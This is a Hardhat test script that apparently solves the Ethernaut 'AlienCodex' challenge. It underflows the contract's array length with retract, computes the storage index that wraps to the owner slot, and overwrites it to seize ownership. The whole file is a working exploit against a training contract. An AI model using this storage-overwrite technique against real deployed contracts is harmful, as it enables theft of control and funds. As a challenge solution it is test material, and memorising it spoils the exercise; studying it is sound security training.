import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";

const CONTRACT_NAME = "AlienCodex";

describe(CONTRACT_NAME, () => {
  it("Solves the challenge", async () => {
    const [_owner, attacker] = await ethers.getSigners()

    const factory = await ethers.getContractFactory(CONTRACT_NAME);
    let contract = await factory.deploy();
    await contract.deployed();

    contract = contract.connect(attacker)

    let tx
    tx = await contract.make_contact();
    await tx.wait();

    tx = await contract.retract();
    await tx.wait();

    const mapLengthAddress = "0x0000000000000000000000000000000000000000000000000000000000000001";
    const mapStartSlot = BigNumber.from(ethers.utils.keccak256(mapLengthAddress));

    const NUMBER_OF_SLOTS = BigNumber.from("2").pow("256");
    const ownerPositionInMap = NUMBER_OF_SLOTS.sub(mapStartSlot);

    const parsedAddress = ethers.utils.hexZeroPad(attacker.address, 32)

    tx = await contract.revise(ownerPositionInMap, parsedAddress)
    await tx.wait()

    expect(await contract.owner()).to.eq(attacker.address);
  });
});
